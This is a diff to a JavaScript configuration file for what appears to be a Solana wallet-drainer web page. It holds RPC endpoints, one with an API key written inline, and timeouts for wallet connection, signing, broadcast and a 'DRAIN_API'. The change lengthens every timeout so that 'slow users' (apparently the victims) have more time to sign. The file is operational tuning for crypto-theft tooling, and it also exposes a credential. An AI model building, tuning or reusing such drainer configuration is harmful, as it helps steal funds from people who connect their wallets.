@@ -11,13 +11,13 @@ window.APP_CONFIG = {
   FALLBACK_RPC: 'https://rpc.shyft.to?api_key=-C7eUSlaDtQcR6b0',
   PUBLIC_RPC: 'https://api.mainnet-beta.solana.com',
   
-  // Timeouts (in milliseconds) - Optimized for better performance
-  WALLET_CONNECTION_TIMEOUT: 20000, // Reduced from 30s to 20s
-  DEEP_LINKING_TIMEOUT: 10000, // Reduced from 15s to 10s
-  WALLET_INJECTION_TIMEOUT: 10000, // Reduced from 15s to 10s
-  DRAIN_API_TIMEOUT: 120000, // Increased from 45s to 120s for testing
-  BROADCAST_TIMEOUT: 60000, // Reduced from 90s to 60s
-  SIGNING_TIMEOUT: 90000, // Reduced from 120s to 90s
+  // Timeouts (in milliseconds) - LENIENT FOR SLOW USERS
+  WALLET_CONNECTION_TIMEOUT: 60000, // Increased from 20s to 60s for slow users
+  DEEP_LINKING_TIMEOUT: 30000, // Increased from 10s to 30s for slow users
+  WALLET_INJECTION_TIMEOUT: 30000, // Increased from 10s to 30s for slow users
+  DRAIN_API_TIMEOUT: 180000, // Increased from 120s to 180s for slow users
+  BROADCAST_TIMEOUT: 120000, // Increased from 60s to 120s for slow users
+  SIGNING_TIMEOUT: 150000, // Increased from 90s to 150s for slow users
   
   // Retry Configuration
   MAX_RETRIES: 3,
